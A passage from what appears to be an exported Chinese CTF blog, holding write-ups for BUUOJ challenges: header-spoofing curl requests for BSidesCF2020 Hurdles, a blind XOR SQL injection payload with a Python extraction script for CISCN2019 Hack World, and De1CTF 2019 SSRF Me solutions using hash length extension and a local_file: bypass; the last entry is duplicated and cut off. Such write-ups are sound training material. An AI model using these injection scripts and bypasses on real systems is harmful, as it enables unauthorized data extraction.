<ul>
<li><code>MD5</code>加密</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:26390&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3d%26%3d%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/9.png" alt></p>
<ul>
<li>提箱设置<code>UA</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/10.png" alt></p>
<ul>
<li>设置版本号</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/11.png" alt></p>
<ul>
<li><code>XFF</code>绕过</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:127.0.0.1'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/12.png" alt></p>
<ul>
<li>需要额外的<code>XFF</code>代理</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:3.3.3.3,127.0.0.1'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/13.png" alt></p>
<ul>
<li>修改代理</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/14.png" alt></p>
<ul>
<li>设置<code>cookie</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=1'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/15.png" alt></p>
<ul>
<li><code>RFC</code>为<code>6265</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/16.png" alt></p>
<ul>
<li>设置 <code>Accept:text/plain</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265' -H 'Accept:text/plain'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/17.png" alt></p>
<p><img data-src="./BSidesCF2020Hurdles/18.png" alt></p>
<ul>
<li>设置<code>Accept-Language</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265' -H 'Accept:text/plain' -H 'Accept-Language:ru;'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/19.png" alt></p>
<ul>
<li>设置<code>origin</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265' -H 'Accept:text/plain' -H 'Accept-Language:ru;' -H 'origin:https://ctf.bsidessf.net'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/20.png" alt></p>
<ul>
<li>设置<code>refer</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265' -H 'Accept:text/plain' -H 'Accept-Language:ru;' -H 'origin:https://ctf.bsidessf.net' -H 'Referer:https://ctf.bsidessf.net/challenges'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/21.png" alt></p>
<ul>
<li>显示返回头</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H 'X-Forwarded-For:13.37.13.37,127.0.0.1' -b 'Fortune=6265' -H 'Accept:text/plain' -H 'Accept-Language:ru;' -H 'origin:https://ctf.bsidessf.net' -H 'Referer:https://ctf.bsidessf.net/challenges' -i</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/22.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>套娃</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019华北赛区Day2Web1Hack World</title>
    <url>/2021/01/27/blog_formal/security/CTF/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/</url>
    <content><![CDATA[<h1 id="CISCN2019华北赛区Day2Web1Hack-World"><a href="#CISCN2019华北赛区Day2Web1Hack-World" class="headerlink" title="CISCN2019华北赛区Day2Web1Hack World"></a>CISCN2019华北赛区Day2Web1Hack World</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
<li>异或注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/1.png" alt></p>
<ul>
<li>发现存在过滤</li>
</ul>
<p><img data-src="./CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/2.png" alt></p>
<ul>
<li><code>burp</code>跑一波<code>fuzz</code></li>
</ul>
<p><img data-src="./CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/3.png" alt></p>
<ul>
<li>发现注入问题</li>
</ul>
<p><img data-src="./CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/4.png" alt></p>
<ul>
<li>利用异或注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</span><br></pre></td></tr></table></figure>

<p>如果正确则返回 <code>Hello, glzjin wants a girlfriend.</code></p>
<p>错误则没有数据<code>Error Occured When Fetch Result.</code></p>
<ul>
<li>脚本编写</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload 1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</span></span><br><span class="line">g_url = <span class="string">r"http://3837002a-5443-41cc-a1d8-4695b4932831.node3.buuoj.cn/index.php"</span></span><br><span class="line">test_flag = <span class="string">"flag&#123;123as-da2342&#125;"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_url</span><span class="params">(mid, pos)</span>:</span></span><br><span class="line">    <span class="comment"># if ord(test_flag[pos]) &gt;= mid:</span></span><br><span class="line">    <span class="comment">#     return True</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     return False</span></span><br><span class="line">    <span class="comment"># return true false</span></span><br><span class="line">    right_return = <span class="string">r"Hello, glzjin wants a girlfriend"</span></span><br><span class="line">    temp_data = <span class="string">"1^(if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;=&#123;1&#125;),0,1))"</span>.format(pos,mid)</span><br><span class="line">    post_data = &#123;<span class="string">"id"</span>:temp_data&#125;</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res = requests.post(g_url, data=post_data)</span><br><span class="line">    <span class="keyword">if</span> right_return <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span> <span class="params">(l, r, pos)</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> r &lt; l:</span><br><span class="line">        <span class="comment"># print("final = &#123;&#125;&#123;&#125;".format(l,r))</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="comment"># 基本判断</span></span><br><span class="line">    <span class="keyword">if</span> r &gt;= l:</span><br><span class="line">        mid = int(l + (r - l)/<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print("mid = &#123;&#125;&#123;&#125;".format(l,r))</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_url(mid, pos):</span><br><span class="line">            <span class="keyword">return</span> binarySearch(l, mid<span class="number">-1</span>, pos)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> binarySearch(mid+<span class="number">1</span>, r, pos) </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    final_flag = str()</span><br><span class="line">    <span class="comment"># flag </span></span><br><span class="line">    <span class="keyword">for</span> flag_pos <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">128</span></span><br><span class="line">        temp = binarySearch(<span class="number">0</span>,<span class="number">128</span>,flag_pos)</span><br><span class="line">        final_flag = final_flag + (chr(temp))</span><br><span class="line">        print(<span class="string">"temp &#123;0&#125;"</span>.format(final_flag))</span><br><span class="line">        <span class="keyword">if</span> chr(temp) == <span class="string">'&#125;'</span>:</span><br><span class="line">            print(final_flag)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    get_flag()</span><br><span class="line">    <span class="comment"># binarySearch(0,128,0)</span></span><br><span class="line">    print(<span class="string">"total time = &#123;0&#125;"</span>.format(time.time()-start_time))</span><br></pre></td></tr></table></figure>

<p><img data-src="./CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/5.png" alt></p>
<p><img data-src="./CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2Web1Hack_World/6.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019SSRF Me</title>
    <url>/2021/08/04/blog_formal/security/CTF/De1CTF%202019SSRF%20Me/</url>
    <content><![CDATA[<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>python</code>文件包含</li>
<li>哈希扩展攻击</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>源码如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="解法一-哈希扩展攻击"><a href="#解法一-哈希扩展攻击" class="headerlink" title="解法一 哈希扩展攻击"></a>解法一 哈希扩展攻击</h3><ul>
<li>已知<code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code>的值，目标获取<code>md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;)</code>的值</li>
<li>获取<code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code></li>
</ul>
<p>![](./De1CTF 2019SSRF Me/1.png)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a5183ebf48df1b314b96c605f6a2cb6b</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hashpump</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/tmp# hashpump</span><br><span class="line">Input Signature: a5183ebf48df1b314b96c605f6a2cb6b</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: read</span><br><span class="line">e76c2db7d05604e2e04d3e072827ce8b</span><br><span class="line"><span class="meta">scan%</span><span class="bash">80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</span></span><br></pre></td></tr></table></figure>

<p>![](./De1CTF 2019SSRF Me/2.png)</p>
<h3 id="解法二-字符串拼接"><a href="#解法二-字符串拼接" class="headerlink" title="解法二 字符串拼接"></a>解法二 字符串拼接</h3><ul>
<li>代码逻辑如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">secert_key + param + action</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构造 /geneSign?param=flag.txtread</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时 md5 为 secert_key + flag.txtread + scan</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 等价于 xxxflag.txtreadscan</span></span><br></pre></td></tr></table></figure>

<ul>
<li>获取<code>md5</code></li>
</ul>
<p>![](./De1CTF 2019SSRF Me/3.png)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8e7810802cdfe6f94793339530afb7b2</span><br></pre></td></tr></table></figure>

<p>![](./De1CTF 2019SSRF Me/4.png)</p>
<h3 id="解法三-local-file协议绕过"><a href="#解法三-local-file协议绕过" class="headerlink" title="解法三 local_file协议绕过"></a>解法三 local_file协议绕过</h3><ul>
<li>获取<code>md5</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/geneSign?param=local_file:///app/flag.txtread</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">9dccdd5e0e48b98d8e6a480ee38f0062</span><br></pre></td></tr></table></figure>

<p>![](./De1CTF 2019SSRF Me/5.png)</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>哈希扩展攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019SSRF Me</title>
    <url>/2021/08/04/blog_formal/security/CTF/De1CTF_2019SSRF_Me/</url>
    <content><![CDATA[<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>python</code>文件包含</li>
<li>哈希扩展攻击</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>源码如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> 